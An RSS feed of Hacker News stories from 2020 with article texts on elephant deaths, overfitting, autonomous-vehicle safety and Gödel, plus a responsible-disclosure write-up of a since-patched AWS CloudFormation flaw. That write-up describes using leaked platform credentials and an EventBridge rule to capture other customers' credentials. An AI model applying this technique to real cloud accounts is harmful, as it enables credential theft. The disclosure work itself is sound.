<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Wed, 23 Sep 2020 20:24:42 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Wed, 23 Sep 2020 20:24:41 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Mystery of hundreds of elephant deaths in Botswana solved]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24553172">thread link</a>) | @pseudolus
<br/>
September 22, 2020 | https://www.cbc.ca/news/technology/elephant-deaths-botswana-1.5732396 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/technology/elephant-deaths-botswana-1.5732396">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The sudden deaths of some 330 elephants in northwestern Botswana earlier this year may have occurred because they drank water contaminated by toxic blue-green algae, the government announced Monday.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5634937.1594073111!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/botswana-elephants.JPG"></p></div><figcaption>A dead elephant is seen in this undated handout image in the Okavango Delta, Botswana, May-June 2020. <!-- --> <!-- -->(Reuters)</figcaption></figure><p><span><p>The sudden deaths of <a href="https://www.cbc.ca/radio/asithappens/as-it-happens-monday-edition-1.5638941/conservationists-can-t-explain-why-more-than-300-elephants-have-dropped-dead-in-botswana-1.5638944">some 330 elephants</a> in northwestern Botswana earlier this year may have occurred because they drank water contaminated by toxic blue-green algae, the government announced Monday.</p>  <p>The elephants in the Seronga area died from a neurological disorder that appears to have been caused by drinking water tainted by "a toxic bloom of cyanobacterium in seasonal pans (water sources) in the region," said Cyril Taolo, acting Director of the Department of Wildlife and National Parks.</p>  <p>The unexplained deaths ceased after the water pans dried up, said Taolo, in a press conference in Gaborone, the capital.</p>  <p>No other wildlife species were affected by the toxic water in the Seronga area, close to Botswana's famed Okavango Delta, said Taolo. Even scavengers, like hyenas and vultures, observed feeding on the elephant carcasses showed no signs of illness, he said.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5634943.1593702780!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/botswana-elephants.JPG 300w,https://i.cbc.ca/1.5634943.1593702780!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/botswana-elephants.JPG 460w,https://i.cbc.ca/1.5634943.1593702780!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/botswana-elephants.JPG 620w,https://i.cbc.ca/1.5634943.1593702780!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/botswana-elephants.JPG 780w,https://i.cbc.ca/1.5634943.1593702780!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/botswana-elephants.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5634943.1593702780!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/botswana-elephants.JPG"></p></div><figcaption>A dead elephant is seen in this undated handout image in the Okavango Delta, Botswana, May-June 2020. <!-- --> <!-- -->(Reuters)</figcaption></figure></span></p>  <p>With an estimated 130,000 elephants, Botswana has the world's largest population of the pachyderms which attracts international tourists.</p>  <p>After the mysterious deaths of the elephants in the Seronga area, the government conducted extensive tests to determine the cause of the fatalities. Both male and female elephants of all ages died, with clinical signs limited to neurologic symptoms, said Taolo. The deaths happened mainly near seasonal water pans and did not spread beyond the initially affected region, he said.</p>  <p>"Mortality event characteristics and the field, clinical, postmortem, histopathological, and laboratory findings suggest the elephants died from neurotoxic cyanobacterium (blue-green alga) toxicosis associated with a toxic bloom of cyanobacterium in seasonal pans in the region," said Taolo.</p>  <p><em><strong>WATCH|&nbsp;Mystery elephant deaths in Botswana:</strong></em></p>  <p><span><span><span></span><span>WARNING: Graphic images that may be disturbing to some.  Botswana authorities are investigating what has killed 275 elephants in recent months.<!-- --> <!-- -->1:01</span></span></span></p>  <p>Taolo maintained neurotoxins from cyanobacteria living in contaminated water could have affected the transmission of neurologic signals within an animal, causing paralysis and death, predominantly related to respiratory failure.</p>  <p>"Neurologic signs were reversed in an animal receiving an opiate antagonist during field immobilization, suggesting the clinical signs arose from some process affecting the animal's neurologic receptors," said Taolo.</p>    <p>He, however, could not explain why these toxins did not affect any other animals drinking the affected water. He also ruled out human efforts like anthrax, poaching and sabotage.</p>  <p>"A monitoring plan of seasonal water-pans on a regular basis to track such future occurrences will be instituted immediately and will also include capacity building to monitor and test for toxins produced ... by cyanobacteria," said Taolo.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/technology/elephant-deaths-botswana-1.5732396</link>
            <guid isPermaLink="false">hacker-news-small-sites-24553172</guid>
            <pubDate>Tue, 22 Sep 2020 11:16:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overfitting, and what to do about it]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24553052">thread link</a>) | @juanorozcov
<br/>
September 22, 2020 | https://www.brainstobytes.com/overfitting-and-what-to-do-about-it/ | <a href="https://web.archive.org/web/*/https://www.brainstobytes.com/overfitting-and-what-to-do-about-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<!--kg-card-begin: markdown--><p>Overfitting is an important concept all data professionals need to deal with sooner or later, especially if you are tasked with building models. A good understanding of this phenomenon will let you identify it and fix it, helping you create better models and solutions.</p>
<p>In brief, overfitting happens when your models fail to learn only the most important general patterns hidden within your data. A very powerful model can learn even the patterns that exist <strong>only</strong> in your training set. When these models are used on real data, their results are usually sub-optimal, so it's important to detect overfitting during training and take action as soon as possible.</p>
<p>In this article, we will discuss how to spot and fix overfitting issues.</p>
<h2 id="ifyoulookhardenoughyouwillfindpatterns">If you look hard enough, you will find patterns</h2>
<blockquote>
<p>We will discuss overfitting in the context of supervised learning, which is the most common scenario.</p>
</blockquote>
<p>As you might remember, in supervised learning you use training data to teach a model how to do something. Some of the most common tasks are regression and classification, which we discussed in a previous article.</p>
<p>Also, you might remember that we set aside two other important datasets before the training step: the validation and training sets. This data will be used to evaluate the performance of the model.</p>
<p>You use the training alongside different algorithms to create models in the hopes of finding specific trends or patterns that <strong>generalize</strong> well on real data. If the model fails to find enough useful patterns, it won't have enough predictive power to be useful in practice. A model that fails to capture the underlying patterns and structure of the data is said to be <strong>underfitting</strong>.</p>
<p>You can solve this problem by increasing the complexity of the model or finding more meaningful data. More powerful models can find subtler patterns in data, and for many problems, this is necessary to avoid overfitting. The main problem is that the training set can have specific quirks or patterns that don't exist in real-world examples of your problem.</p>
<p>A model that looks for patterns in a very aggressive fashion can end up learning these quirks and reduce their performance on real examples. When models learn too many of these patterns, they are said to be <strong>overfitting</strong>. An overfitting model performs very well on the data used to train it but performs poorly on data it hasn't seen before.</p>
<p>The process of training a model is about striking a balance between underfitting and overfitting. Because models can't differentiate between patterns that only exist in the training set and patterns that generalize well, it's your responsibility to regulate the learning process. If you use a very weak model you risk underfitting, but if you use a very powerful one you can overfit.</p>
<h2 id="areallifeexamplepresidentialelections">A real life example: presidential elections</h2>
<p>One of my favorite examples for illustrating the idea of overfitting is the following comic made by Randall Munroe:</p>
<p><img src="https://www.brainstobytes.com/content/images/2020/01/xkcd_overfitting.png" alt="xkcd_overfitting"></p>
<p>This comic represents a series of patterns in presidential elections that were true but didn't provide any meaningful predictive power for the task of predicting the next U.S president.</p>
<p>A predictive model that takes into consideration these patterns would perform poorly. The model would believe they represent significant trends and learn to spot them for making predictions. Things like <strong>No one with two middle names have become president</strong> are true in the dataset, but have little or no relation with the real problem being solved.</p>
<p>A real-world dataset can have similar quirks or patterns due to lots of reasons. It's important to understand that the fact that patterns exist doesn't mean they provide meaningful information for our tasks. An algorithm can't make this distinction by itself, so it's up to us to help them find the patterns that generalize well.</p>
<p>Ideally, your model would only learn meaningful patterns that let you predict or classify instances it hasn't seen before.</p>
<p>So, in practice, how can we spot overfitting?</p>
<h2 id="findingoutifyourmodeloverfits">Finding out if your model overfits</h2>
<p>A model that overfits performs very well on the data it's been trained with, but worse on data it hasn't seen before. The best way of finding out if your model is overfitting is by evaluating its performance on both the training and validation sets. This is much easier to see with an example:</p>
<p><img src="https://www.brainstobytes.com/content/images/2020/01/overfitting.png" alt="overfitting"></p>
<p>The previous graph represents the accuracy results of an image classifier built with Keras. On the X-axis you see the number of epochs (training cycles) and on the Y-axis the accuracy of the classifier.</p>
<p>After every epoch, the classifier learns deeper patterns in the data. You can notice an interesting tendency:</p>
<ul>
<li>As more epochs pass, the performance on the training set improves. This happens because the classifier learns more intricacies of the training set and can perform better predictions.</li>
<li>As more epochs pass, the classifier performs better on the validation set. This happens because it learns general patterns that apply well to data it hasn't seen yet. After a specific point (around 20 epochs), the performance on the validation set ceases to improve. This is the result of learning to reproduce idiosyncrasies in the training set that don't generalize well. After this point, we see that the model is <strong>overfitting</strong>.</li>
</ul>
<p>The easiest way to find out if your model is overfitting is by measuring its performance on your training and validation sets. If your model performs much better with training data than with validation data, you are overfitting.</p>
<p>Now that you know how to spot overfitting, let's talk about how to fix it.</p>
<h2 id="dealingwithoverfitting">Dealing with overfitting</h2>
<p>There are several ways of dealing with overfitting. Which technique is more effective depends on your task, data, and algorithms, but that doesn't mean you can apply only one of them.</p>
<p>All the techniques used to reduce overfitting are centered around a single idea: increase the influence of patterns that generalize well and reduce the influence of less meaningful patterns. Let's explore 4 of the most common ways of achieving this:</p>
<h4 id="1getmoredata">1. Get more data</h4>
<p>Getting more data is usually one of the most effective ways of fighting overfitting. Having more quality data reduces the influence of quirky patterns in your training set, and puts it closer to the distribution of the data in the real worlds.</p>
<p>Sometimes, finding data is not easy, so you need to see it as an investment, as you might need to spend time and money to get it. In this sense, it's better to see data as an asset, and not as a natural resource you can just grab.</p>
<h4 id="2regularization">2. Regularization</h4>
<p>Regularization is a set of techniques used to reduce the model's capacity to learn complex patterns. These techniques usually shrink the hypothesis space of the model by reducing its complexity, ensuring that it learns mostly general patterns.</p>
<p>The techniques are usually model specific. For example, in a tree-like model, you would reduce the depth of the tree or the total number of leaves. In neural networks, you can reduce the number of trainable weights or layers, or insert dropout layers at different parts of the network.</p>
<p>Another way of applying regularization is by training different models of varying complexities and comparing their performance and how strongly they overfit.</p>
<h4 id="3earlystopping">3. Early stopping</h4>
<p>Stopping the learning process halfway can ensure the model learns just enough information about the training set to perform well but not overfit.</p>
<p>In the previous Keras classifier example, we see how our network starts to overfit after around 20 epochs.</p>
<p>A way to ensure the network doesn't overfit is to stop the training when we reach the number of epochs when the network overfits. This is a simple (yet effective) solution for overfitting, and it applies to other algorithms.</p>
<h4 id="4ensemblemodels">4. Ensemble models</h4>
<p>Ensemble models are collections of smaller models whose results are averaged for making predictions. They are very good at resisting overfitting, as they distribute errors among sub-models of different complexities.</p>
<p>You can think of ensembles as groups of experts whose opinion you average for reaching a general consensus. This is one of the reasons ensemble models gained lots of popularity in the last years.</p>
<p>Random Forest (and its variants) is one of the most popular forms of ensemble models, and it's widely applied to lots of different problems with usually very good results.</p>
<p>There are lots of other techniques you can use, but these four represent the most common ways of dealing with overfitting. The best way of learning how to use these techniques is by applying them on real projects using your favorite ML libraries and tools.</p>
<h2 id="whatyouneedtorememberaboutoverfitting">What you need to remember about overfitting</h2>
<p>Overfitting is an extremely important topic for any professional data scientist or machine learning engineer, but it can be a bit daunting in the beginning. This is a summary of the most important ideas you need to remember:</p>
<ul>
<li>Patterns exist in your training dataset. Some of these patterns represent real tendencies in the problem space, while others are just quirks of your training set. Failing to learn meaningful patterns results in underfitting, and learning too many of the quirky patterns results in overfitting. Both scenarios lead to models that perform poorly on real data.</li>
<li>Training a model is about balancing two competing forces: underfitting and overfitting. You want to learn patterns from your training set, but only the ones that generalize well. The dividing line is impossible to calculate theoretically, so lots of experimentation is needed to find the right compromise.</li>
<li>You can easily spot overfitting by comparing the performance metrics of running your model when against the validation set and the training set. A model that performs much better on the training data than on the validation data is overfitting.</li>
<li>There are lots of techniques used for dealing with overfitting. Usually, you increase the amount of data available or reduce the models learning power. A model that looks too hard for patterns is likely to end up learning unimportant quirks.</li>
</ul>
<p>If you keep these things in mind when training your …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.brainstobytes.com/overfitting-and-what-to-do-about-it/">https://www.brainstobytes.com/overfitting-and-what-to-do-about-it/</a></em></p>]]>
            </description>
            <link>https://www.brainstobytes.com/overfitting-and-what-to-do-about-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24553052</guid>
            <pubDate>Tue, 22 Sep 2020 10:59:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Security September: Cataclysms in the Cloud Formations]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24552986">thread link</a>) | @boyter
<br/>
September 22, 2020 | https://onecloudplease.com/blog/security-september-cataclysms-in-the-cloud-formations | <a href="https://web.archive.org/web/*/https://onecloudplease.com/blog/security-september-cataclysms-in-the-cloud-formations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">

		<div data-page-title="Security September: Cataclysms in the Cloud Formations – One Cloud Please">

			<section>

	

</section>

<section>

	<p><img src="https://onecloudplease.com/images/posts/security-september-1.jpg" alt=""></p>

<p><em>This is the fourth of a 5-part series on AWS exploits and similar findings discovered over the course of 2020. All findings discussed in this series have been <a href="https://aws.amazon.com/security/vulnerability-reporting/">disclosed</a> to the AWS security team and had patches rolled out to all affected regions, where necessary. A big thanks to my friend and fellow Australian <a href="https://twitter.com/__steele">Aidan Steele</a> for co-authoring this series with me. This post was written by Aidan.</em></p>

<p>Back in November 2019, AWS CloudFormation <a href="https://aws.amazon.com/about-aws/whats-new/2019/11/now-extend-aws-cloudformation-to-model-provision-and-manage-third-party-resources/">added support</a> for “resource providers” - a new and improved way of extending CloudFormation with user-authored resources. Not just that, it is also the way that all new resources are added to CloudFormation by AWS themselves. This was a substantial improvement over “custom resources”, which hadn’t seen any change since at least 2013 other than <a href="https://aws.amazon.com/about-aws/whats-new/2015/04/aws-cloudformation-supports-aws-lambda-backed-custom-resources/">Lambda support in 2015</a>. This post won’t get into the differences or benefits of resource providers, for that check out <a href="https://aws.amazon.com/blogs/mt/managing-resources-using-aws-cloudformation-resource-types/">this AWS blog post</a>.</p>

<p>On January 17th, <a href="https://twitter.com/ben11kehoe">Ben Kehoe</a> CloudFormation extraordinaire sent me a Twitter DM with a link to a GitHub <a href="https://github.com/aws-cloudformation/cloudformation-cli-python-plugin/pull/71">pull request</a> that set off his spidey-senses. I was excited to receive this because a) Ben thought of me! and b) it combined CloudFormation and credentials in the cloud in a novel way, two of my favourite things. This was the excuse I needed to finally dig into resource providers - albeit not until the 21st when I had some time.</p>

<h2 id="pulling-things-apart">Pulling things apart</h2>

<p>The first thing I noticed is that (unlike custom resources) the Lambda function you are authoring ends up not running in your AWS account - it runs in an AWS-managed account. I was immediately curious about what permissions <strong>my</strong> code had in <strong>their</strong> account - you’d hope it’s locked down! I was also curious about how the code I wrote appeared to have a role in my account - where was the role being assumed?</p>

<p>Rather than try to understand the framework provided by CloudFormation and how things are <strong>meant</strong> to work, I decided to drop down a level and log the raw input to the Lambda function, to see how things <strong>actually</strong> work. This is an excerpt of the input passed to the Lambda when a resource is being created:</p>

<p><img src="https://onecloudplease.com/images/posts/security-september-2.png" alt=""></p>

<p>So there are at least <strong>four</strong> different sets of credentials in play here:</p>

<ul>
  <li>The <code>callerCredentials</code>: These are the credentials that I am expected to use. They are for the role assumed in <strong>my</strong> account to actually create, update, delete, etc the resource in question.</li>
  <li>The <code>providerCredentials</code>: These are the credentials for the <code>LogAndMetricsDeliveryRole</code> role in the <code>CloudFormationManagedUploadInfrastructure</code> stack, i.e. for writing logs that appear in <strong>my</strong> account.</li>
  <li>The (not pictured) Lambda execution role’s credentials: this appears to have permission only to write logs within the AWS-managed account.</li>
  <li>The <code>platformCredentials</code>: These are the interesting ones. They are for a role in the AWS-managed account. That role has permission to call a handful of permissions, but the ones that caught my eye were <code>events:PutRule</code>, <code>events:PutTarget</code>, <code>events:RemoveTarget</code>, <code>events:DeleteRule</code>.</li>
</ul>

<p>Why does the Lambda function need permission to invoke those EventBridge APIs? Resource creation might take a long time and Lambda is limited to 15 minutes, so the service has support for reinvoking the Lambda periodically to ask “is it done yet?” and EventBridge cron jobs are a great fit for this. The way it works is by creating a one-off rule scheduled to run one minute in the future, with a target of the same Lambda. It specifies that the Lambda should be reinvoked with a hardcoded input string - namely the input that <strong>this</strong> invocation of the Lambda received.</p>

<h2 id="curiosity-intensifies">Curiosity intensifies</h2>

<p>This piqued my curiosity. What if I used the API to trigger a different target, like a Lambda in my account? No luck, they must have used the <code>events:TargetArn</code> condition key to restrict the target to only this Lambda. So I tried something else: what if instead I tried a different rule? I tried to create a rule that would invoke my Lambda in their account that matched events with <code>{"detail-type": ["AWS API Call via CloudTrail"]}</code>. I was immediately inundated with a firehose of events. I rushed to turn it off as it wasn’t my intention to break things, just curiosity.</p>

<p>I looked at the events. Was this really a security issue or more a “that’s cute” kind of thing? Most events were uninteresting. But one caught my eye. It was a call to <code>events:PutTarget</code>. The CloudTrail event included the payload. I’ve highlighted the noteworthy part.</p>

<p><img src="https://onecloudplease.com/images/posts/security-september-3.png" alt=""></p>

<p>In order to reinvoke the function a minute later with the same payload, we established earlier that the target was created with a constant JSON input. That input includes credentials for a role in the customer’s account. Multiple (all?) customers are serviced by the AWS-managed account. So I could see credentials for other AWS customers using resource providers. They might be using it without realising: AWS are using this pattern for first-party types - I saw <code>AWS::WAFv2::RuleGroup</code> fly by in the logs.</p>



<p>That afternoon I reported the issue to the <a href="https://aws.amazon.com/security/vulnerability-reporting/">AWS security team</a>. They got back to me within 9 hours. They asked for some clarification (fair, I was a bit frazzled when I wrote the first email!) and any reproduction steps I could provide. Given I’d slapped together a very manual proof-of-concept, I set about creating a more useful reproduction for them.</p>

<p>The CloudFormation service team also reached out to me. They indicated that they had actually already caught this internally and a fix was underway. A few days later on January 25th, they told me that a fix had been deployed to a couple of regions and asked if I could try again. A few minutes later, I got a follow up from the AWS security team with the same request - things move surprisingly quickly at AWS!</p>

<p>I tried again. After creating my rule I got a few events, but it quickly dried up without me even needing to turn it off. I looked through the events recorded. I didn’t see any of those problematic ones before, no matter how many times I tried. I did see this interesting one though:</p>

<p><img src="https://onecloudplease.com/images/posts/security-september-4.png" alt=""></p>

<p>Clever! They had created an alarm that would trigger whenever a malicious rule was created. This was a solid tactical mitigation. Unfortunately the IAM policy conditions available on <code>events:PutRule</code> weren’t rich enough to block me outright, but this stopped the bleeding. I also noticed the unusual absence of any of the <code>events:PutTarget</code> API call events. I don’t know how they did this as omitting those from CloudTrail/EventBridge isn’t possible for customers’ accounts. I guess AWS have some secret sauce.</p>

<h2 id="closing-out">Closing out</h2>

<p>On January 31st I got a follow up email from AWS Security letting me know that the issue has been resolved.</p>

<p>On June 30th the CloudFormation team released version 2 of the resource provider protocol. It came with a number of benefits, but the change most visible to me was that the <code>platformCredentials</code> field had disappeared. It is no longer necessary as CloudFormation itself handles the reinvocation of the Lambda function.</p>

<p>Finally, on August 26th AWS sent out the following email, gently encouraging people to migrate to the new protocol for resource providers. I wouldn’t be surprised if this was followed by an eventual deprecation of v1.</p>

<p><img src="https://onecloudplease.com/images/posts/security-september-5.png" alt=""></p>

<h2 id="thanks">Thanks</h2>

<p>I’d like to thank Ben Kehoe for pointing this out to me in the first place. Without his keen eye and intuition for sensible security, I would have never noticed this. I’d like to thank Ian for being a great sounding board throughout the process. His <a href="https://twitter.com/iann0036/status/1161871038336028672">tweets</a> last year about Lake Formation issues made me feel confident that AWS would respond positively to my email. I’d also like to thank the AWS Security team who made me feel very comfortable both reporting my first issue and that it was being addressed in a thorough and impressively timely fashion. And a second thanks to Ian for motivating me to write my first blog posts in years!</p>


</section>

		</div>

	</div></div>]]>
            </description>
            <link>https://onecloudplease.com/blog/security-september-cataclysms-in-the-cloud-formations</link>
            <guid isPermaLink="false">hacker-news-small-sites-24552986</guid>
            <pubDate>Tue, 22 Sep 2020 10:48:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Accident Preventers – TUM]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24552865">thread link</a>) | @rbanffy
<br/>
September 22, 2020 | https://www.tum.de/nc/en/about-tum/news/press-releases/details/36225/ | <a href="https://web.archive.org/web/*/https://www.tum.de/nc/en/about-tum/news/press-releases/details/36225/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article itemscope="itemscope" itemtype="http://schema.org/Article"><header><p itemprop="description">
					Before autonomous vehicles participate in road traffic, they must demonstrate conclusively that they do not pose a danger to others. New software developed at the Technical University of Munich (TUM) prevents accidents by predicting different variants of a traffic situation every millisecond.
				</p></header><section><p>A car approaches an intersection. Another vehicle jets out of the cross street, but it is not yet clear whether it will turn right or left. At the same time, a pedestrian steps into the lane directly in front of the car, and there is a cyclist on the other side of the street. People with road traffic experience will in general assess the movements of other traffic participants correctly.</p><p>“These kinds of situations present an enormous challenge for autonomous vehicles controlled by computer programs,” explains <a href="https://www.professoren.tum.de/en/althoff-matthias" target="_blank">Matthias Althoff</a>, Professor of Cyber-Physical Systems at TUM. "But autonomous driving will only gain acceptance of the general public if you can ensure that the vehicles will not endanger other road users – no matter how confusing the traffic situation."</p><div id="c58839"><div><div><p>The ultimate goal when developing software for autonomous vehicles is to ensure that they will not cause accidents. Althoff, who is a member of the <a href="https://www.msrm.tum.de/en/home/" target="_blank">Munich School of Robotics and Machine Intelligence</a> at TUM, and his team have now developed a software module that permanently analyzes and predicts events while driving. Vehicle sensor data are recorded and evaluated every millisecond. The software can calculate all possible movements for every traffic participant – provided they adhere to the road traffic regulations – allowing the system to look three to six seconds into the future.</p><p>Based on these future scenarios, the system determines a variety of movement options for the vehicle. At the same time, the program calculates potential emergency maneuvers in which the vehicle can be moved out of harm’s way by accelerating or braking without endangering others. The autonomous vehicle may only follow routes that are free of foreseeable collisions and for which an emergency maneuver option has been identified.</p></div></div></div><div id="c58840"><div><div><p>This kind of detailed traffic situation forecasting was previously considered too time-consuming and thus impractical. But now, the Munich research team has shown not only the theoretical viability of real-time data analysis with simultaneous simulation of future traffic events: They have also demonstrated that it delivers reliable results.</p><p>The quick calculations are made possible by simplified dynamic models. So-called reachability analysis is used to calculate potential future positions a car or a pedestrian might assume. When all characteristics of the road users are taken into account, the calculations become prohibitively time-consuming. That is why Althoff and his team work with simplified models. These are superior to the real ones in terms of their range of motion – yet, mathematically easier to handle. This enhanced freedom of movement allows the models to depict a larger number of possible positions but includes the subset of positions expected for actual road users.</p></div></div></div><div id="c58841"><div><div><p>For their evaluation, the computer scientists created a virtual model based on real data they had collected during test drives with an autonomous vehicle in Munich. This allowed them to craft a test environment that closely reflects everyday traffic scenarios. "Using the simulations, we were able to establish that the safety module does not lead to any loss of performance in terms of driving behavior, the predictive calculations are correct, accidents are prevented, and in emergency situations the vehicle is demonstrably brought to a safe stop," Althoff sums up.</p><p>The computer scientist emphasizes that the new security software could simplify the development of autonomous vehicles because it can be combined with all standard motion control programs.</p></div></div></div><div><h3>
			Publications:
		</h3><p>Christian Pek, Stefanie Manzinger, Markus Koschi, Matthias Althoff: „Using online verification to prevent autonomous vehicles from causing accidents“, Nature Machine Intelligence 2, 518-528 (2020),<br><a href="https://www.nature.com/articles/s42256-020-0225-y" target="_blank">https://www.nature.com/articles/s42256-020-0225-y</a></p></div><div><h3>
			More information:
		</h3><div><ul><li>The research was funded by the BMW Group's CAR@TUM project, the Ko-HAF project (Cooperative Highly Automated Driving) of the Federal Ministry for Economic Affairs and Energy and the German Research Foundation DFG.</li><li>The Munich School of Robotics and Machine Intelligence (MSRM) at the Technical University of Munich is an integrative research center. The aim of this center is to research the fundamentals of robotics, perception and artificial intelligence in order to develop technologies in the areas of health, work and mobility. Examples of development work include adaptive and networked robot assistants for the industry of the future, autonomous flying and driving robot teams for the mobility of the future, and medical nanorobots and assistant robots for a self-determined life in old age.</li></ul></div></div><div><div><div><h3>
		Corporate Communications Center
	</h3></div></div></div><section></section></section></article></div></div></div>]]>
            </description>
            <link>https://www.tum.de/nc/en/about-tum/news/press-releases/details/36225/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24552865</guid>
            <pubDate>Tue, 22 Sep 2020 10:24:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kurt Gödel and the Contradiction in the U.S. Constitution]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24552825">thread link</a>) | @rwmj
<br/>
September 22, 2020 | https://jeffreykegler.github.io/personal/morgenstern.html | <a href="https://web.archive.org/web/*/https://jeffreykegler.github.io/personal/morgenstern.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    <p>by Jeffrey Kegler</p>
    <p>The story of Gödel's citizenship hearing had been much repeated over the years.
      What was known was that on 5 December 1947, Kurt Gödel went to his citizenship hearing in Trenton, New Jersey.
      The examiner was Judge Philip Forman.
      As his witnesses, Gödel brought his two closest friends, Oskar Morgenstern and Albert Einstein.
      Gödel was granted citizenship, and took his oath on 2 April 1948.
      Those were the reliably established facts.
    </p>
    <p>Afterwards, Morgenstern told many people that he and Einstein had had their hands full preventing the brilliant, but politically naive, Gödel from derailing his citizenship chances.
      No account directly from Morgenstern or anyone else at the hearing had survived, but hearsay versions circulated widely.
      The hearsay versions show considerable variation, but their burden is something like the following:
    </p>
    <p>Gödel, in his usual manner, had read extensively in preparing for the hearing.
      In the course of his studies, Gödel decided that he had discovered a flaw in the U.S. Constitution --
      a contradiction which would allow the U.S. to be turned into a dictatorship.
      Gödel, usually quite reticent, seemed to feel a need to make this known.
      Morgenstern and Einstein warned Gödel that it would be a disaster to confront his citizenship examiner with visions of a Constitutional flaw leading to an American dictatorship.
    </p>
    <p>Arriving in Princeton, the trio had no idea who the examiner would be.
      They happened to run into Judge Forman.
      Forman was a friend of Einstein's --
      when Einstein became a citizen, Forman had administered the oath.
      How lucky this was became apparent almost immediately during the questioning.
      Forman happened to remark how fortunate it was that the US was not a dictatorship, which Gödel took as a cue to explain his discovery.
      A surprised Forman exchanged glances with Einstein and Morgenstern, cut Gödel off, and forced-marched the hearing through to a successful conclusion.
    </p>
    <h2>The History, and the Legend</h2>
    <p>Nobody seems to know what Gödel's proof was.
      Many versions of the hearing that circulated featured invented dialog.
      In faculty room yarns this would be unfortunate, but not surprising.
      More startling is the presence of such dialog in the version given
      in the extremely scholarly and very carefully edited Gödel's
      <cite>Collected Works</cite>, Vol. I, p. 12.
      A footnote in
      <cite>Collected Works</cite>
      admits that its version is pure hearsay.
    </p>
    <p>I've learned to distrust such sources.
      When I was in graduate school, studying Theory of Computation, Kurt Gödel was still alive.
      I heard many tales of Gödel's eccentric behavior from mathematicians.
      Gödel certainly was eccentric, and first-hand tales of this abound,
      but I later discovered that every single anecdote I'd gotten second- or third-hand was almost certainly false.
    </p>
    <p>1997 marked a turning point in Gödel biography,
      with the publication of John Dawson's careful and reliable biography of Gödel:
      <cite>Logical Dilemmas</cite>.
      When Dawson wrote, all four participants in the hearing were dead.
      Morgenstern refers, briefly and cryptically, to the hearing in his diary, but does not say enough to fully support the story.
      Dawson in general, and quite correctly, rejected the use of hearsay.
      But this story was the most well-known story about Gödel, and nobody doubted that it had a basis in truth.
    </p>
    <p>Dawson apparently decided that some reference to this story must be made, regardless of sourcing difficulty.
      Given no alternative to using hearsay, Dawson was careful to seek out what could reasonably be thought of as the
      source of the best hearsay -- Morgenstern's widow.
      She certainly would have heard the story many times, and directly from Morgenstern.
      Dawson interviewed her on 17 October 1983.
      Dawson's account in
      <cite>Logical Dilemmas</cite>
      (pp. 179-180) is based on that interview and Morgenstern's diary entry.
    </p>
    <h2>The Lost Document</h2>
    <p>According to Dawson (p. 300), Morgenstern had written up an account of this matter for publication, but Dawson was unable to locate it.
      Dorothy Morgenstern was sure that she'd once had her husband's write-up,
      and that she'd sent it to someone.
      But she could not remember who.
      This wasn't exactly promising for the accuracy of her retelling.
      But best evidence is best evidence -- you take it how it comes.
    </p>
    <p>In dealing with the matter as a Wikipedia editor,
      I took the position that Dawson's account of this hearing was the final word.
      The other versions were either retellings of the Dawson account,
      hearsay from less reliable sources or pure speculation.
      Regardless of which of the three they were, they were to be rejected as sources for the Wikipedia article.
    </p>
    <p>When dealing with the matter as a novelist, the God Proof,
      I took the position that this story had become a legend as much as any tale of an 11th century saint.
      Since it was a legend, I was free as a writer of fiction to add any incident or dialog I thought to be in the spirit of the thing.
    </p>
    <p>But now the "lost" Morgenstern document has reappeared.
      Apparently the IAS has had it all these years.
    </p>
    <h2>Links</h2>
    <ul>
      <li>
